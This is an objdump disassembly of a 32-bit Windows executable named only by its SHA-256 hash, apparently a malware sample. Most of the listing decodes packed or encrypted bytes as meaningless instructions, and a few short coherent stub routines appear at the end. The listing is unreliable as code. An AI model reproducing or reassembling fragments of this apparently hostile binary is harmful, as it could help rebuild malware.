
595468dbe69ae2d3534602e9d45971b7dc3e83deb6c0de386d60533899521701.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	clc    
  4d0001:	fwait
  4d0002:	mov    esi,0x9051f6f0
  4d0007:	mov    esi,0x98953dab
  4d000c:	pop    edx
  4d000d:	arpl   bp,bx
  4d000f:	lods   al,BYTE PTR ds:[esi]
  4d0010:	or     DWORD PTR [eax-0x4fd2f40f],edx
  4d0016:	mov    dh,0xba
  4d0018:	and    al,0xa8
  4d001a:	(bad)  
  4d001c:	or     BYTE PTR [ecx],ah
  4d001e:	stos   BYTE PTR es:[edi],al
  4d001f:	jmp    0x4d001d
  4d0021:	xor    esi,DWORD PTR [esi+esi*8-0x1efaffe]
  4d0028:	out    0xbd,eax
  4d002a:	out    dx,eax
  4d002b:	add    DWORD PTR [edx],ebx
  4d002d:	ret    0xf4a
  4d0030:	shl    BYTE PTR [ebx-0x759cdbdf],1
  4d0036:	inc    edx
  4d0037:	dec    eax
  4d0038:	or     dh,BYTE PTR [esi+0x15]
  4d003b:	or     BYTE PTR [eax-0x76],bh
  4d003e:	mov    ch,0x22
  4d0040:	jmp    0xb9dd:0xa2b449fa
  4d0047:	mov    ds,WORD PTR [ebx+0x66c1bea3]
  4d004d:	fadd   QWORD PTR [ebp+0x3e]
  4d0050:	adc    DWORD PTR [edi-0x5e],ecx
  4d0053:	mov    ah,0xf5
  4d0055:	mov    al,0x5d
  4d0057:	test   al,0x97
  4d0059:	inc    esp
  4d005a:	pop    esp
  4d005b:	push   0x44a3bb6a
  4d0060:	jg     0x4d0099
  4d0062:	pop    edi
  4d0063:	mov    ebx,0x40e75182
  4d0068:	popa   
  4d0069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d006a:	and    DWORD PTR [edx],0x8
  4d006d:	popf   
  4d006e:	call   0x601868bc
  4d0073:	sbb    edi,edx
  4d0075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0076:	hlt    
  4d0077:	aaa    
  4d0078:	push   es
  4d0079:	mov    cl,0x13
  4d007b:	push   ecx
  4d007c:	add    DWORD PTR [ecx-0x46b9e914],edi
  4d0082:	js     0x4d00d2
  4d0084:	and    ecx,DWORD PTR [edi-0x3ab1ed14]
  4d008a:	data16 in al,dx
  4d008c:	or     BYTE PTR [ebx+0x22],al
  4d008f:	pop    edx
  4d0090:	std    
  4d0091:	aas    
  4d0092:	mov    ds:0xc6006ebe,al
  4d0097:	inc    ecx
  4d0098:	mov    ds:0x22639ff,eax
  4d009d:	pop    es
  4d009e:	(bad)  
  4d009f:	fldcw  WORD PTR [ecx-0x7]
  4d00a2:	cmp    BYTE PTR [eax+ebp*4-0x6f],bh
  4d00a6:	mov    edi,0x406ef889
  4d00ab:	jbe    0x4d0106
  4d00ad:	push   ds
  4d00ae:	jne    0x4d010a
  4d00b0:	mov    eax,ds:0x45f8ae1
  4d00b5:	and    eax,0x7ff0a075
  4d00ba:	dec    esi
  4d00bb:	dec    eax
  4d00bc:	call   0xd5d8:0xc4b7b185
  4d00c3:	jl     0x4d0126
  4d00c5:	jge    0x4d00d9
  4d00c7:	jge    0x4d006d
  4d00c9:	sub    ch,0x6a
  4d00cc:	xchg   esp,eax
  4d00cd:	adc    BYTE PTR [edx],0x95
  4d00d0:	clc    
  4d00d1:	jne    0x4d012b
  4d00d3:	imul   esi,DWORD PTR [ebx-0x76],0xffffffa6
  4d00d7:	or     dh,dl
  4d00d9:	int3   
  4d00da:	pop    eax
  4d00db:	dec    ebx
  4d00dc:	aaa    
  4d00dd:	mov    esi,0x42341cf4
  4d00e2:	pop    edi
  4d00e3:	cmp    ecx,esp
  4d00e5:	repnz les edx,FWORD PTR [esi+eax*4]
  4d00e9:	arpl   WORD PTR [edx-0x3a372f16],dx
  4d00ef:	ins    BYTE PTR es:[edi],dx
  4d00f0:	xor    BYTE PTR [ebp+0x75fa7b52],cl
  4d00f6:	lods   eax,DWORD PTR ds:[esi]
  4d00f7:	test   BYTE PTR [edx+0x73088ed0],dl
  4d00fd:	xor    eax,0xe0ceeed7
  4d0102:	sub    BYTE PTR [ecx],dh
  4d0104:	test   al,0x35
  4d0106:	adc    BYTE PTR [edi],ah
  4d0108:	lea    edi,[esi]
  4d010a:	add    DWORD PTR [esp+ecx*8-0xb],esp
  4d010e:	push   0xc70a9da0
  4d0113:	pop    edi
  4d0114:	fs hlt 
  4d0116:	test   eax,0xac0af0f0
  4d011b:	pop    ds
  4d011c:	pushf  
  4d011d:	jb     0x4d00df
  4d011f:	xor    BYTE PTR [ecx-0x64d9bc09],bh
  4d0125:	pop    es
  4d0126:	adc    ah,dh
  4d0128:	mov    edx,0x9a70f062
  4d012d:	repz call 0x6d46:0x5907f25e
  4d0135:	idiv   esp
  4d0137:	(bad)
  4d013a:	sar    DWORD PTR ds:0x3bbba85e,1
  4d0140:	mov    ebx,0x55e49be2
  4d0145:	aam    0xa5
  4d0147:	das    
  4d0148:	scas   eax,DWORD PTR es:[edi]
  4d0149:	and    ebp,DWORD PTR [edx-0x79]
  4d014c:	fwait
  4d014d:	loop   0x4d0144
  4d014f:	add    ebp,DWORD PTR [ebp-0x374370cf]
  4d0155:	paddb  mm1,QWORD PTR [edx-0x163b8abf]
  4d015c:	cli    
  4d015d:	jb     0x4d012c
  4d015f:	sbb    al,BYTE PTR [edi]
  4d0161:	lea    edi,[ebp+0x66ba85ad]
  4d0167:	cmp    dh,cl
  4d0169:	inc    edi
  4d016a:	cdq    
  4d016b:	lds    edx,FWORD PTR [ebx]
  4d016d:	das    
  4d016e:	jnp    0x4d01a9
  4d0170:	gs loope 0x4d0182
  4d0173:	inc    esi
  4d0174:	test   al,0x21
  4d0176:	jmp    0x4d018d
  4d0178:	test   eax,0xa83ce969
  4d017d:	out    0x6d,eax
  4d017f:	adc    al,0xab
  4d0181:	adc    BYTE PTR [esi-0x408352c4],0xcf
  4d0188:	lods   eax,DWORD PTR ds:[esi]
  4d0189:	mov    dh,0x0
  4d018b:	mov    BYTE PTR [edi-0xc],al
  4d018e:	pop    esi
  4d018f:	add    eax,DWORD PTR [ebp-0x2e03ba01]
  4d0195:	or     al,0x12
  4d0197:	gs mov bl,0xba
  4d019a:	push   ss
  4d019b:	jge    0x4d019c
  4d019d:	sub    eax,0xd20283f5
  4d01a2:	repnz std 
  4d01a4:	jmp    FWORD PTR ds:0xd26a5a0d
  4d01aa:	xor    ah,BYTE PTR [esi-0x3dbcd369]
  4d01b0:	rcr    BYTE PTR [esi-0x48],0xc9
  4d01b4:	xor    DWORD PTR [edx+0x75d03a52],ecx
  4d01ba:	adc    ebp,eax
  4d01bc:	mov    dx,0x3aee
  4d01c0:	fwait
  4d01c1:	popf   
  4d01c2:	pushf  
  4d01c3:	add    eax,0x6a3ed72
  4d01c8:	enter  0x746a,0x6d
  4d01cc:	cmp    eax,0xbb7d8c20
  4d01d1:	imul   eax,DWORD PTR [eax-0x4422b65a],0xffffffe4
  4d01d8:	sub    DWORD PTR [ebx+0x47],ecx
  4d01db:	adc    ah,BYTE PTR [ecx+0x2d]
  4d01de:	shl    DWORD PTR [esi+0x10],1
  4d01e1:	out    dx,eax
  4d01e2:	xchg   esp,eax
  4d01e3:	xor    BYTE PTR [edx],0x27
  4d01e6:	imul   ebx,DWORD PTR [edi+0x1f8e544],0xffffffd5
  4d01ed:	sbb    al,BYTE PTR [edi]
  4d01ef:	(bad)  
  4d01f0:	mov    bh,0x25
  4d01f2:	sub    DWORD PTR [ebx-0x352a1d3e],ecx
  4d01f8:	push   ebx
  4d01f9:	add    eax,0xfaae37a1
  4d01fe:	mov    ebx,0xb88eab91
  4d0203:	xchg   edx,eax
  4d0204:	jb     0x4d01d8
  4d0206:	xchg   edi,eax
  4d0207:	push   ebp
  4d0208:	int3   
  4d0209:	xor    DWORD PTR [eax-0x56],ebp
  4d020c:	lea    ecx,[edi+0x10]
  4d020f:	scas   al,BYTE PTR es:[edi]
  4d0210:	je     0x4d01c4
  4d0212:	out    dx,eax
  4d0213:	push   ecx
  4d0214:	add    bl,BYTE PTR [ebp-0x65]
  4d0217:	mov    dl,0x23
  4d0219:	push   0x69
  4d021b:	jno    0x4d01fb
  4d021d:	xchg   ebp,eax
  4d021e:	xchg   esi,eax
  4d021f:	mov    fs,WORD PTR [edx]
  4d0221:	fisttp WORD PTR [ebp+0x32542f75]
  4d0227:	dec    esi
  4d0228:	xor    dh,BYTE PTR [edi]
  4d022a:	shl    DWORD PTR [ebp+0xca0545],0x3c
  4d0231:	sti    
  4d0232:	xor    eax,0x3efb4aff
  4d0237:	je     0x4d01f3
  4d0239:	test   DWORD PTR [edx+ecx*1+0x53],0x186ab28d
  4d0241:	jbe    0x4d028b
  4d0243:	in     eax,dx
  4d0244:	call   0xd9e4be28
  4d0249:	xchg   ebp,eax
  4d024a:	dec    eax
  4d024b:	mov    edi,0x90b7c027
  4d0250:	xor    bl,cl
  4d0252:	mov    esi,0xcd27d47f
  4d0257:	jle    0x4d0233
  4d0259:	pop    ebp
  4d025a:	repz mul BYTE PTR [edx]
  4d025d:	into   
  4d025e:	add    edx,DWORD PTR [ebp-0x44b26f53]
  4d0264:	test   al,0xd9
  4d0266:	mov    dh,0x95
  4d0268:	mov    al,0x25
  4d026a:	lahf   
  4d026b:	jbe    0x4d0214
  4d026d:	gs addr16 push cs
  4d0270:	sbb    ch,BYTE PTR [ebx]
  4d0272:	sub    DWORD PTR [ebp+0x2d],edi
  4d0275:	in     eax,0x63
  4d0277:	mov    bh,0xd7
  4d0279:	jno    0x4d02c4
  4d027b:	into   
  4d027c:	jmp    0x2dfd:0x17dad202
  4d0283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0284:	pop    edi
  4d0285:	pop    es
  4d0286:	pop    edi
  4d0287:	lahf   
  4d0288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0289:	cli    
  4d028a:	lds    ebx,FWORD PTR [edi+0x5b]
  4d028d:	add    eax,0x6fa5f0ba
  4d0292:	push   0x23
  4d0294:	pop    ebx
  4d0295:	out    0x9d,al
  4d0297:	xchg   DWORD PTR [ecx-0x37293e06],edx
  4d029d:	pop    esi
  4d029e:	xchg   edx,eax
  4d029f:	jns    0x4d022b
  4d02a1:	clc    
  4d02a2:	ins    BYTE PTR es:[edi],dx
  4d02a3:	fadd   QWORD PTR [ebx-0x6d15e9a1]
  4d02a9:	mov    edi,DWORD PTR [ecx+0x77]
  4d02ac:	xor    dl,ch
  4d02ae:	adc    DWORD PTR [edx+ebx*2+0x1d],ebx
  4d02b2:	repnz sbb ebx,esp
  4d02b5:	or     eax,0xc4a31a64
  4d02ba:	stos   DWORD PTR es:[edi],eax
  4d02bb:	imul   esi,ebx,0x9996543b
  4d02c1:	push   edx
  4d02c2:	push   eax
  4d02c3:	push   0x68
  4d02c5:	lods   eax,DWORD PTR ds:[esi]
  4d02c6:	cmp    cl,BYTE PTR [ecx+edi*1+0x53]
  4d02ca:	lds    esi,FWORD PTR [ebx-0x2fb55cb3]
  4d02d0:	xor    eax,0xcf2fb55d
  4d02d5:	xchg   ebp,eax
  4d02d6:	clc    
  4d02d7:	pop    ebx
  4d02d8:	sub    ch,BYTE PTR [esi+0x2]
  4d02db:	cmc    
  4d02dc:	bound  edx,QWORD PTR [esi+0x4e]
  4d02df:	pop    esp
  4d02e0:	icebp  
  4d02e1:	stc    
  4d02e2:	sbb    ebp,DWORD PTR [eax+0x57f40678]
  4d02e8:	mov    DWORD PTR [eax-0x71],edx
  4d02eb:	nop
  4d02ec:	jl     0x4d02ed
  4d02ee:	fidiv  DWORD PTR [ebx-0x13]
  4d02f1:	add    BYTE PTR ds:0x4c56148c,dh
  4d02f7:	js     0x4d030a
  4d02f9:	stos   BYTE PTR es:[edi],al
  4d02fa:	ret    
  4d02fb:	xchg   eax,esi
  4d02fd:	push   esp
  4d02fe:	xchg   edx,eax
  4d02ff:	test   BYTE PTR [eax],dl
  4d0301:	add    DWORD PTR [edx-0x2b],edi
  4d0304:	dec    edx
  4d0305:	lods   al,BYTE PTR ds:[esi]
  4d0306:	mov    cl,0xf2
  4d0308:	or     bh,bl
  4d030a:	push   ss
  4d030b:	(bad)  
  4d030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d030e:	shl    BYTE PTR ds:0x87941b52,cl
  4d0314:	adc    eax,0x60a86c8e
  4d0319:	jp     0x4d02d3
  4d031b:	push   esi
  4d031c:	mov    al,0x85
  4d031e:	inc    edi
  4d031f:	stos   BYTE PTR es:[edi],al
  4d0320:	sbb    DWORD PTR gs:[edx-0x55f40abc],0xa84510df
  4d032b:	jo     0x4d031d
  4d032d:	jmp    0x4d02ee
  4d032f:	(bad)  
  4d0330:	and    DWORD PTR [eax+eax*2],edx
  4d0333:	(bad)  
  4d0334:	arpl   sp,dx
  4d0336:	les    ecx,FWORD PTR [eax+0x77a35c9d]
  4d033c:	je     0x4d02e1
  4d033e:	pop    esp
  4d033f:	fisttp WORD PTR [esi]
  4d0341:	popa   
  4d0342:	(bad)  
  4d0343:	and    BYTE PTR [ebx],al
  4d0345:	lahf   
  4d0346:	cmp    dh,bl
  4d0348:	push   ebx
  4d0349:	ins    DWORD PTR es:[edi],dx
  4d034a:	(bad)  
  4d034b:	ja     0x4d0307
  4d034d:	in     al,dx
  4d034e:	xchg   edx,eax
  4d034f:	loopne 0x4d02f0
  4d0351:	cwde   
  4d0352:	ss xchg ebp,eax
  4d0354:	jecxz  0x4d031e
  4d0356:	mov    ebx,cs
  4d0358:	or     DWORD PTR [edi],edi
  4d035a:	and    BYTE PTR [edi],dl
  4d035c:	cmc    
  4d035d:	dec    esi
  4d035e:	adc    al,0xec
  4d0360:	iret   
  4d0361:	cmp    al,0xd4
  4d0363:	lahf   
  4d0364:	and    eax,0xdc603c7d
  4d0369:	sub    BYTE PTR [ebx+0x547d248b],0x2e
  4d0370:	cld    
  4d0371:	sub    BYTE PTR [ebx+0x545eedd1],0x2e
  4d0378:	adc    edi,eax
  4d037a:	fs fldz 
  4d037d:	pop    es
  4d037e:	fwait
  4d037f:	push   cs
  4d0380:	jmp    0xa43e687c
  4d0385:	fsub   DWORD PTR [esi]
  4d0387:	inc    ebx
  4d0388:	and    al,0xe2
  4d038b:	mov    esp,0xb051f7f
  4d0390:	and    eax,0xab7e80fa
  4d0396:	iret   
  4d0397:	addr16 inc ecx
  4d0399:	push   esp
  4d039a:	xor    BYTE PTR [eax+0x29206bf3],bl
  4d03a0:	(bad)  
  4d03a1:	fwait
  4d03a2:	mov    al,ds:0x60714fdb
  4d03a7:	sub    dh,dl
  4d03a9:	cmp    ah,BYTE PTR [eax+ebx*4]
  4d03ac:	mov    al,ds:0x58f334b6
  4d03b1:	test   DWORD PTR [eax-0x1b3b537f],edx
  4d03b7:	pop    ebx
  4d03b8:	loopne 0x4d0429
  4d03ba:	aas    
  4d03bb:	pop    ebp
  4d03bc:	sub    edx,DWORD PTR [eax+0x5bea2c0]
  4d03c2:	aas    
  4d03c3:	pop    ebp
  4d03c4:	inc    edx
  4d03c5:	or     bh,BYTE PTR [eax-0x51]
  4d03c8:	adc    eax,0xf409d954
  4d03cd:	stos   DWORD PTR es:[edi],eax
  4d03ce:	es div ch
  4d03d1:	(bad)  
  4d03d3:	or     DWORD PTR [ebx],ecx
  4d03d5:	or     BYTE PTR [edi],0x76
  4d03d8:	cmc    
  4d03d9:	jg     0x4d03cb
  4d03db:	adc    eax,DWORD PTR [eax+0x444d2ba4]
  4d03e1:	lods   eax,DWORD PTR ds:[esi]
  4d03e2:	xchg   ebp,eax
  4d03e3:	fimul  DWORD PTR [ebx]
  4d03e6:	mov    esp,DWORD PTR [edi+eiz*1-0xc]
  4d03ea:	mov    esp,0x45c50a0f
  4d03ef:	lock idiv DWORD PTR [edx]
  4d03f2:	add    al,BYTE PTR [edx+esi*1-0x3083e182]
  4d03f9:	sub    DWORD PTR [ecx],0xdb3752f8
  4d03ff:	pop    es
  4d0400:	scas   eax,DWORD PTR es:[edi]
  4d0401:	enter  0x6c6c,0x6a
  4d0405:	lock rcl DWORD PTR [ebx-0x1f8bf069],cl
  4d040c:	jp     0x4d03b7
  4d040e:	nop
  4d040f:	pop    ds
  4d0410:	xchg   DWORD PTR [esi-0x49],edx
  4d0413:	push   esp
  4d0414:	and    BYTE PTR [edx-0x77],0xab
  4d0418:	jg     0x4d03b7
  4d041a:	mov    esi,0x2ed82c8
  4d041f:	xchg   ecx,eax
  4d0420:	inc    edx
  4d0421:	jae    0x4d03ab
  4d0423:	les    ebp,FWORD PTR [edi]
  4d0425:	push   cs
  4d0426:	push   0xffffffcd
  4d0428:	mov    esp,0x92be0e37
  4d042d:	xor    BYTE PTR [ebp+0x40],bh
  4d0430:	repnz dec esp
  4d0432:	fstp   TBYTE PTR [edi-0x4ada497d]
  4d0438:	(bad)  
  4d0439:	aam    0x1f
  4d043b:	stos   DWORD PTR es:[edi],eax
  4d043c:	mov    al,0xeb
  4d043e:	push   esp
  4d043f:	push   0xffffffda
  4d0441:	pop    edx
  4d0442:	out    0xe7,eax
  4d0444:	loope  0x4d03ef
  4d0446:	sbb    BYTE PTR [eax],bl
  4d0448:	and    BYTE PTR [esi],bh
  4d044a:	(bad)  
  4d044b:	jmp    0x1a19c631
  4d0450:	adc    BYTE PTR [edx+0x2b],al
  4d0453:	adc    bh,BYTE PTR [ecx-0x42b9b607]
  4d0459:	adc    edi,DWORD PTR [ecx-0x3c105fd2]
  4d045f:	sub    eax,0x57985d8c
  4d0464:	ds pop ss
  4d0466:	jae    0x4d04bd
  4d0468:	adc    ebx,DWORD PTR [edi+ecx*2]
  4d046b:	add    eax,0xfe9a6799
  4d0470:	dec    edx
  4d0471:	jl     0x4d043a
  4d0473:	les    edx,FWORD PTR [edi]
  4d0475:	pop    es
  4d0476:	mov    dh,0x87
  4d0478:	jmp    0xa393:0x26605c6c
  4d047f:	lahf   
  4d0480:	jmp    0x8a9a:0xe5b0
  4d0486:	push   ebp
  4d0487:	lds    ecx,FWORD PTR [edi+0x19]
  4d048a:	stos   DWORD PTR es:[edi],eax
  4d048b:	cmp    dh,BYTE PTR [edx+0x4e261847]
  4d0491:	push   cs
  4d0492:	and    al,0x65
  4d0494:	mov    edi,DWORD PTR [ebp+0x51]
  4d0497:	out    0x1,eax
  4d0499:	enter  0x68fe,0x50
  4d049d:	mov    al,ds:0x5fbd9701
  4d04a2:	push   ecx
  4d04a3:	push   0xe807e099
  4d04a8:	repz pop ss
  4d04aa:	in     al,dx
  4d04ab:	mov    esp,0x431420f6
  4d04b0:	or     esp,DWORD PTR [edi]
  4d04b2:	jne    0x4d04b5
  4d04b4:	sbb    bh,cl
  4d04b6:	adc    eax,0xa71374f7
  4d04bb:	or     eax,0x5658ec8d
  4d04c0:	adc    eax,0xeca9a72c
  4d04c5:	pop    esi
  4d04c6:	leave  
  4d04c7:	and    BYTE PTR [esi+0x9],0x37
  4d04cb:	jge    0x4d0474
  4d04cd:	neg    BYTE PTR [ebx]
  4d04cf:	sub    BYTE PTR [edi+0xa8a7149],0x46
  4d04d6:	nop
  4d04d7:	lds    eax,FWORD PTR [edx+0x7232fb89]
  4d04dd:	sbb    al,0x69
  4d04df:	outs   dx,BYTE PTR ds:[esi]
  4d04e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04e1:	jecxz  0x4d0479
  4d04e3:	xchg   ecx,eax
  4d04e4:	jmp    0xdc1c9a45
  4d04e9:	add    ebp,esp
  4d04eb:	sbb    al,0x46
  4d04ed:	(bad)  
  4d04ee:	adc    esp,ebx
  4d04f0:	and    esp,DWORD PTR [esi]
  4d04f2:	out    dx,al
  4d04f3:	sbb    al,0xde
  4d04f5:	or     al,0x8
  4d04f7:	dec    esi
  4d04f8:	and    ebx,DWORD PTR [ebp+0x0]
  4d04fb:	mov    cl,0x33
  4d04fd:	mov    edi,0x9422278a
  4d0502:	je     0x4d0532
  4d0504:	adc    esi,edi
  4d0506:	iret   
  4d0507:	cmc    
  4d0508:	or     cl,BYTE PTR [eax+esi*2]
  4d050b:	inc    esi
  4d050c:	xor    BYTE PTR [eax+edx*2-0x46],0x7f
  4d0511:	mov    esi,DWORD PTR [esi+eax*1]
  4d0514:	div    BYTE PTR [ebp+0x11]
  4d0517:	dec    esi
  4d0518:	pop    esi
  4d0519:	mov    DWORD PTR [edx+ebp*8+0x28],eax
  4d051d:	aaa    
  4d051e:	xor    ebx,edi
  4d0520:	sub    al,0xc8
  4d0522:	and    al,0x1d
  4d0524:	push   esi
  4d0525:	cld    
  4d0526:	jmp    esp
  4d0528:	stos   DWORD PTR es:[edi],eax
  4d0529:	add    ecx,DWORD PTR [ecx-0x27e78571]
  4d052f:	xor    esp,edi
  4d0531:	dec    edi
  4d0532:	xchg   esp,eax
  4d0533:	cmp    BYTE PTR [edx],bl
  4d0535:	mov    al,0xd3
  4d0537:	cmp    DWORD PTR [ebx+0x7e],ebx
  4d053a:	nop
  4d053b:	cs adc esi,ebp
  4d053e:	in     eax,0x34
  4d0540:	inc    edx
  4d0541:	or     dh,BYTE PTR [eax-0x31]
  4d0544:	inc    esp
  4d0545:	mov    dh,0x5
  4d0547:	cmp    DWORD PTR [ecx],edx
  4d0549:	dec    ecx
  4d054a:	push   eax
  4d054b:	(bad)  
  4d054c:	jne    0x4d05c5
  4d054e:	and    al,0x86
  4d0550:	test   BYTE PTR [eax-0x14861cbd],0x22
  4d0557:	test   esi,ebp
  4d0559:	mov    ecx,DWORD PTR [ebp-0x13]
  4d055c:	les    esi,FWORD PTR [bx+di-0x5d98]
  4d0561:	mov    esi,0x31eaa412
  4d0566:	ds mov al,0x81
  4d0569:	push   cs
  4d056a:	sub    al,0x57
  4d056c:	(bad)  
  4d056d:	lock sub DWORD PTR [ebp-0x64d5a07d],esi
  4d0574:	call   0x3f9a3120
  4d0579:	pop    eax
  4d057a:	aam    0xb2
  4d057c:	dec    ebp
  4d057d:	in     al,0x4f
  4d057f:	into   
  4d0580:	jnp    0x4d05b0
  4d0582:	mov    al,0x31
  4d0584:	xchg   BYTE PTR [ebx],bh
  4d0586:	push   edi
  4d0587:	daa    
  4d0588:	outs   dx,BYTE PTR ds:[esi]
  4d0589:	imul   esi,eax,0x9d425963
  4d058f:	sbb    ah,BYTE PTR [ecx-0x47703492]
  4d0595:	cmp    al,0xe5
  4d0597:	xor    esi,ebx
  4d0599:	ret    0xd870
  4d059c:	data16 rcl BYTE PTR [ebx+0x34],0xfc
  4d05a1:	add    al,BYTE PTR ds:0xe352d5cb
  4d05a7:	shr    DWORD PTR [ebp*4-0x679d76e4],cl
  4d05ae:	push   ebx
  4d05af:	cli    
  4d05b0:	pop    edi
  4d05b1:	ins    BYTE PTR es:[edi],dx
  4d05b2:	xor    eax,0x27a3c64a
  4d05b7:	mov    dh,0x3b
  4d05b9:	pop    esp
  4d05ba:	fmul   DWORD PTR [ecx-0x3a]
  4d05bd:	mov    ds:0x5c3bb68f,eax
  4d05c2:	jo     0x4d05d0
  4d05c4:	sub    al,0xd7
  4d05c6:	test   DWORD PTR [edx-0x71],ebx
  4d05c9:	jbe    0x4d059f
  4d05cb:	or     ebx,DWORD PTR [edi]
  4d05cd:	lock pop esi
  4d05cf:	les    edx,FWORD PTR [esi+0x18]
  4d05d2:	and    ch,BYTE PTR [edx]
  4d05d4:	lods   eax,DWORD PTR ds:[esi]
  4d05d5:	neg    ebp
  4d05d7:	aad    0x3f
  4d05d9:	imul   BYTE PTR [edi+0x4f8ec088]
  4d05df:	in     eax,dx
  4d05e0:	xor    bh,ch
  4d05e2:	es dec ebp
  4d05e4:	xor    eax,0x59f829bd
  4d05e9:	ja     0x4d05df
  4d05eb:	ins    DWORD PTR es:[edi],dx
  4d05ec:	push   ebp
  4d05ed:	out    dx,eax
  4d05ee:	bound  esp,QWORD PTR ds:[ecx]
  4d05f1:	icebp  
  4d05f2:	test   bh,ch
  4d05f4:	adc    ebx,eax
  4d05f6:	mov    esp,0x47a0b03b
  4d05fb:	cmp    BYTE PTR [ebx+0x4a],dl
  4d05fe:	mov    al,0xfb
  4d0600:	outs   dx,BYTE PTR ds:[esi]
  4d0601:	mov    ecx,0xa08fe711
  4d0606:	mov    cl,0xa4
  4d0608:	out    dx,eax
  4d0609:	(bad)  
  4d060a:	mov    eax,0x57387a5f
  4d060f:	mov    al,ds:0x60131e87
  4d0614:	jns    0x4d064d
  4d0616:	std    
  4d0617:	sub    bh,BYTE PTR [eax+0x4a]
  4d061a:	out    dx,eax
  4d061b:	(bad)  [edx+0x73b110b5]
  4d0621:	mov    bl,0xf3
  4d0623:	dec    edi
  4d0624:	mov    cs,WORD PTR [ebx+eiz*2+0x3]
  4d0628:	jb     0x4d0633
  4d062a:	mov    ebp,0xc35e8f66
  4d062f:	cdq    
  4d0630:	jb     0x4d05d3
  4d0632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0633:	imul   edi,ecx,0x7097c35e
  4d0639:	mov    eax,ds:0xb611683c
  4d063e:	ret    0x14ed
  4d0641:	retf   
  4d0642:	add    DWORD PTR [edi],edx
  4d0644:	out    dx,al
  4d0645:	xor    al,0xfe
  4d0647:	stos   DWORD PTR es:[edi],eax
  4d0648:	mov    ds:0x59250123,eax
  4d064d:	mov    cl,0xa1
  4d064f:	cmp    al,0x32
  4d0651:	mov    esp,DWORD PTR [edx+0x10]
  4d0654:	sbb    al,0x2d
  4d0656:	dec    ebp
  4d0657:	mov    esp,0xca4c0ec2
  4d065c:	pop    edi
  4d065d:	jge    0x4d065b
  4d065f:	xchg   edi,eax
  4d0660:	xor    ebp,0xffffffdc
  4d0663:	sbb    DWORD PTR [esi-0x39],0x1
  4d0667:	jmp    0xebe7edaa
  4d066c:	cmp    DWORD PTR [esi+ebp*4],0xffffffb0
  4d0670:	push   esi
  4d0671:	xor    edi,edi
  4d0673:	test   ax,0xab98
  4d0677:	push   ds
  4d0678:	sahf   
  4d0679:	shr    esi,cl
  4d067b:	or     ch,BYTE PTR [ebx-0x51]
  4d067e:	sbb    al,0x9c
  4d0680:	dec    edi
  4d0681:	aaa    
  4d0682:	cli    
  4d0683:	fs repnz in al,0x6
  4d0687:	es retf 0xdb63
  4d068b:	mov    eax,ds:0x84815bc4
  4d0690:	aas    
  4d0691:	aaa    
  4d0692:	mov    esi,0x41c8c232
  4d0697:	int    0x3f
  4d0699:	aaa    
  4d069a:	mov    esi,0x41c8c232
  4d069f:	int    0x3f
  4d06a1:	aaa    
  4d06a2:	mov    esi,0x41c8c232
  4d06a7:	int    0x3f
  4d06a9:	aaa    
  4d06aa:	mov    esi,0x41c8c232
  4d06af:	int    0x3f
  4d06b1:	cwde   
  4d06b2:	mov    esi,0x46bfc232
  4d06b7:	int    0x3f
  4d06b9:	inc    esp
  4d06ba:	mov    ecx,0xe2fe7732
  4d06bf:	jp     0x4d0705
  4d06c1:	sbb    BYTE PTR [edx+0x61b57c69],bl
  4d06c7:	mov    dh,0x11
  4d06c9:	pop    esi
  4d06ca:	xchg   esi,eax
  4d06cb:	pop    esp
  4d06cc:	xlat   BYTE PTR ds:[ebx]
  4d06cd:	ds les eax,FWORD PTR es:[edi+0x701c86ef]
  4d06d5:	fs (bad) 
  4d06d7:	cmp    bh,BYTE PTR [esi+eax*1-0x72]
  4d06db:	ret    
  4d06dc:	inc    bx
  4d06de:	push   ebp
  4d06df:	scas   eax,DWORD PTR es:[edi]
  4d06e0:	mov    cl,0xaa
  4d06e2:	test   edi,ebp
  4d06e4:	sub    DWORD PTR [ecx+0x45b033f1],0x4e
  4d06eb:	lods   eax,DWORD PTR ds:[esi]
  4d06ec:	pop    edi
  4d06ed:	call   DWORD PTR ds:0x4d203c
  4d06f3:	call   edi
  4d06f5:	add    BYTE PTR [eax],al
  4d06f7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d06fd:	sub    esp,0x58
  4d0700:	lea    ecx,[eax+0x70]
  4d0703:	mov    DWORD PTR [ebp-0x38],0x7b5a
  4d070a:	push   ecx
  4d070b:	call   0x4d1434
  4d0710:	add    esp,0x4
  4d0713:	pop    ecx
  4d0714:	push   ecx
  4d0715:	push   edx
  4d0716:	push   ebx
  4d0717:	push   DWORD PTR [ecx+0x154]
  4d071d:	call   0x4d11f4
  4d0722:	add    esp,0xc
  4d0725:	pop    ecx
  4d0726:	push   ecx
  4d0727:	mov    esi,0x0
  4d072c:	push   esi
  4d072d:	call   0x4d0e3c
  4d0732:	add    esp,0x4
  4d0735:	pop    ecx
  4d0736:	add    esp,0x58
  4d0739:	pop    ebp
  4d073a:	ret    
  4d073b:	add    BYTE PTR [edi-0x1],bl
  4d073e:	adc    eax,0x4d2074
  4d0743:	call   edi
  4d0745:	add    BYTE PTR [eax],al
  4d0747:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d074d:	sub    esp,0x58
  4d0750:	lea    eax,ds:0x4d3080
  4d0756:	xor    DWORD PTR [eax+0x13c],0x6
  4d075d:	push   eax
  4d075e:	call   0x4d0c98
  4d0763:	add    esp,0x4
  4d0766:	pop    eax
  4d0767:	push   eax
  4d0768:	push   DWORD PTR [eax+0x18c]
  4d076e:	push   DWORD PTR [eax+0x70]
  4d0771:	call   0x4d0920
  4d0776:	add    esp,0x8
  4d0779:	pop    eax
  4d077a:	push   eax
  4d077b:	call   0x4d1434
  4d0780:	add    esp,0x4
  4d0783:	pop    eax
  4d0784:	add    esp,0x58
  4d0787:	pop    ebp
  4d0788:	ret    
  4d0789:	add    BYTE PTR [eax],al
  4d078b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0791:	sub    esp,0x28
  4d0794:	mov    ecx,0x4d304c
